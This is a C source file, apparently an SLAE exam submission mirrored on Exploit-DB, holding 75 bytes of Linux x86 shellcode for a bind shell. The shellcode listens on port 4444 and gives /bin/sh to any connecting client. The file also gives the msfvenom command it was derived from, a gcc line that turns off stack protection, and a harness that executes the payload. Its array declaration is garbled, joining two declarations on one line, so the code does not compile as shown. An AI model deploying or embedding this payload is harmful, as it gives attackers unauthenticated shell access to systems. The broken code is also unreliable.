/*

Architecture	: x86
OS		: Linux
Author		: wetw0rk
ID		: SLAE-958
Shellcode Size	: 75 bytes
Bind Port	: 4444
Description	: A linux/x86 bind shell via /bin/sh. Created by analysing msfvenom;
		  original payload was 78 bytes and contained 1 NULL. My shellcode
		  is 75 and contains 0 NULLS ;).

Original Metasploit Shellcode:
	sudo msfvenom -p linux/x86/shell_bind_tcp -b "\x00" -f c --smallest -i 0

Test using:
	gcc -fno-stack-protector -z execstack tshell.c

Exploit-DB Mirror:
        https://www.exploit-db.com/exploits/42254/

*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
char shellcode[]=
"\x6a\x66\x58\x99\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e"
"\x52\x66\x68\x11\x5c\x52\x6a\x02\x6a\x10\x51\x50\x89\xe1\xb0"
"\x66\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66"
"\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80";

int main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

